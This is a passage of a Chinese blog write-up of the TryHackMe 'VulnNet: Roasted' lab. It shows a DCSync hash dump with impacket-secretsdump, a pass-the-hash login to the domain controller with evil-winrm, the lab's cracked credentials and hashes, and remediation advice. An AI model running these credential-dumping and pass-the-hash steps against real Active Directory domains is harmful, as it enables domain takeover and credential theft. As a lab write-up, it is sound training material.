+<p><strong>a-whitehat</strong> 是 <strong>Domain Admins</strong> 组成员，拥有完全的域管权限。</p>
+</blockquote>
+<h2 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>DCSync 攻击利用域管权限模拟域控制器行为，通过 MS-DRSUAPI（目录复制服务）协议从域控的 NTDS.DIT 数据库中提取所有用户的 NTLM 哈希。攻击者无需登录域控本机，只需拥有”复制目录更改”等权限即可远程执行。这是 Active Directory 环境中最具破坏性的攻击之一，一次即可获取<strong>全域所有用户的哈希</strong>。</p>
+<h3 id="执行攻击-2"><a href="#执行攻击-2" class="headerlink" title="执行攻击"></a>执行攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# impacket-secretsdump -dc-ip 10.48.132.165 vulnnet-rst/a-whitehat:&#x27;bNdKVkjv3RR9ht&#x27;@10.48.132.165 -just-dc-ntlm</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::</span><br><span class="line">Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:...:7633f01273fc92450b429d6067d1ca32:::</span><br><span class="line">enterprise-core-vn:1104:...:8752ed9e26e6823754dce673de76ddaf:::</span><br><span class="line">a-whitehat:1105:...:1bd408897141aa076d62e9bfc1a5956b:::</span><br><span class="line">t-skid:1109:...:49840e8a32937578f8c55fdca55ac60b:::</span><br><span class="line">j-goldenhand:1110:...:1b1565ec2b57b756b912b5dc36bc272a:::</span><br><span class="line">j-leet:1111:...:605e5542d42ea181adeca1471027e022:::</span><br><span class="line">WIN-2BO8M1OE1M1$:1000:...:404d719f937daa9532bd1457c8abed91:::</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>成功提取<strong>全域用户 NTLM 哈希</strong>，包含 Administrator 的哈希 <code>c2597747aa5e43022a3a3049a3c3b09d</code>。</p>
+</blockquote>
+<h3 id="Pass-the-Hash-登录域控"><a href="#Pass-the-Hash-登录域控" class="headerlink" title="Pass-the-Hash 登录域控"></a>Pass-the-Hash 登录域控</h3><p>使用 Administrator 的 NTLM 哈希直接登录域控，无需明文密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# evil-winrm -i 10.48.132.165 -u Administrator -H &#x27;c2597747aa5e43022a3a3049a3c3b09d&#x27;</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        3/13/2021   3:34 PM             39 system.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>成功获取 <strong>system.txt</strong>！完全控制域控。</p>
+</blockquote>
+<hr>
+<h2 id="攻击路径总结"><a href="#攻击路径总结" class="headerlink" title="攻击路径总结"></a>攻击路径总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RID 枚举 → 域用户列表</span><br><span class="line">    ↓ AS-REP Roasting（t-skid 不需要预身份验证）</span><br><span class="line">t-skid（AS-REP 哈希破解）</span><br><span class="line">    ↓ Kerberoasting（enterprise-core-vn SPN TGS 破解）</span><br><span class="line">enterprise-core-vn（WinRM 登录）</span><br><span class="line">    ↓ NETLOGON 共享发现 ResetPassword.vbs → a-whitehat 明文凭据</span><br><span class="line">a-whitehat（Domain Admins 组成员）</span><br><span class="line">    ↓ DCSync 提取 Administrator NTLM 哈希</span><br><span class="line">Administrator（Pass-the-Hash 登录域控）</span><br><span class="line">    ↓</span><br><span class="line">system.txt ✓</span><br></pre></td></tr></table></figure>
+
+<h2 id="凭据汇总"><a href="#凭据汇总" class="headerlink" title="凭据汇总"></a>凭据汇总</h2><table>
+<thead>
+<tr>
+<th>用户名</th>
+<th>密码&#x2F;哈希</th>
+<th>获取方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>t-skid</td>
+<td><code>tj072889*</code></td>
+<td>AS-REP Roasting + john 破解</td>
+</tr>
+<tr>
+<td>enterprise-core-vn</td>
+<td><code>ry=ibfkfv,s6h,</code></td>
+<td>Kerberoasting + john 破解</td>
+</tr>
+<tr>
+<td>a-whitehat</td>
+<td><code>bNdKVkjv3RR9ht</code></td>
+<td>NETLOGON 共享 VBS 脚本泄露</td>
+</tr>
+<tr>
+<td>Administrator</td>
+<td><code>c2597747aa5e43022a3a3049a3c3b09d</code> (NTLM)</td>
+<td>DCSync 提取</td>
+</tr>
+</tbody></table>
+<h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2><table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>修复建议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AS-REP Roasting</td>
+<td>禁用所有用户的”不需要预身份验证”选项</td>
+</tr>
+<tr>
+<td>Kerberoasting</td>
+<td>服务账户使用强密码（25+ 字符），启用 AES256 加密</td>
+</tr>
+<tr>
+<td>NETLOGON 明文密码</td>
+<td>禁止在共享中存放含凭据的脚本，改用安全凭据管理</td>
+</tr>
+<tr>
+<td>DCSync 权限过宽</td>
+<td>限制 DRSUAPI 复制权限，仅授予必要 DC 和管理员</td>
+</tr>
+</tbody></table>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_VulnNet_Roasted.html">https://x9wd09ncc.github.io/post/TryHackMe_VulnNet_Roasted.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/medium/">medium</a><a class="post-meta__tags" href="/tags/smb/">SMB</a><a class="post-meta__tags" href="/tags/windows/">windows</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%8E%A7/">域控</a><a class="post-meta__tags" href="/tags/as-rep-roasting/">AS-REP Roasting</a><a class="post-meta__tags" href="/tags/kerberoasting/">Kerberoasting</a><a class="post-meta__tags" href="/tags/dcsync/">DCSync</a><a class="post-meta__tags" href="/tags/active-directory/">Active Directory</a><a class="post-meta__tags" href="/tags/kerberos/">Kerberos</a><a class="post-meta__tags" href="/tags/impacket/">impacket</a><a class="post-meta__tags" href="/tags/evil-winrm/">evil-winrm</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Ninja%20Skills.html" title="TryHackMe_Ninja Skills"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Ninja Skills</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_glitch.html" title="TryHackMe_GLITCH"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_GLITCH</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Prioritise.html" title="TryHackMe_Prioritise"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-18</div><div class="title">TryHackMe_Prioritise</div></div></a></div><div><a href="/post/TryHackMe_Mr%20Robot%20CTF.html" title="TryHackMe_Mr Robot CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-18</div><div class="title">TryHackMe_Mr Robot CTF</div></div></a></div><div><a href="/post/TryHackMe_Super%20Secret%20TIp.html" title="TryHackMe_Super Secret TIp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-23</div><div class="title">TryHackMe_Super Secret TIp</div></div></a></div><div><a href="/post/TryHackMe_VulnNet_Internal.html" title="TryHackMe_VulnNet_Internal"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_VulnNet_Internal</div></div></a></div><div><a href="/post/TryHackMe_WhyHackMe.html" title="TryHackMe_WhyHackMe"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-23</div><div class="title">TryHackMe_WhyHackMe</div></div></a></div><div><a href="/post/TryHackMe_olympusroom.html" title="TryHackMe_olympusroom"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-18</div><div class="title">TryHackMe_olympusroom</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VulnNet-Roasted"><span class="toc-number">1.</span> <span class="toc-text">VulnNet: Roasted</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RPC-%E6%9E%9A%E4%B8%BE%EF%BC%88%E5%8F%97%E9%99%90%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">RPC 枚举（受限）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E5%85%B1%E4%BA%AB%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.1.3.</span> <span class="toc-text">SMB 共享枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.</span> <span class="toc-text">域用户枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RID-%E6%9A%B4%E5%8A%9B%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text">RID 暴力枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D%E5%88%97%E8%A1%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">提取用户名列表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">1.3.</span> <span class="toc-text">AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.2.</span> <span class="toc-text">执行攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%93%88%E5%B8%8C"><span class="toc-number">1.3.3.</span> <span class="toc-text">破解哈希</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.4.</span> <span class="toc-text">Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">执行攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3-TGS-%E5%93%88%E5%B8%8C"><span class="toc-number">1.4.3.</span> <span class="toc-text">破解 TGS 哈希</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM-%E7%99%BB%E5%BD%95"><span class="toc-number">1.5.</span> <span class="toc-text">WinRM 登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%EF%BC%9A%E5%9F%9F%E7%AE%A1%E6%8E%A5%E7%AE%A1"><span class="toc-number">1.6.</span> <span class="toc-text">提权：域管接管</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E5%85%B1%E4%BA%AB%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%87%AD%E6%8D%AE"><span class="toc-number">1.6.1.</span> <span class="toc-text">SMB 共享中发现凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E5%9F%9F%E7%AE%A1%E6%9D%83%E9%99%90"><span class="toc-number">1.6.2.</span> <span class="toc-text">确认域管权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync-%E6%94%BB%E5%87%BB"><span class="toc-number">1.7.</span> <span class="toc-text">DCSync 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.7.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB-2"><span class="toc-number">1.7.2.</span> <span class="toc-text">执行攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Hash-%E7%99%BB%E5%BD%95%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.7.3.</span> <span class="toc-text">Pass-the-Hash 登录域控</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">攻击路径总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E6%B1%87%E6%80%BB"><span class="toc-number">1.9.</span> <span class="toc-text">凭据汇总</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.10.</span> <span class="toc-text">安全建议</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.bootcdn.net/ajax/libs/click-heart/1.0.0/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
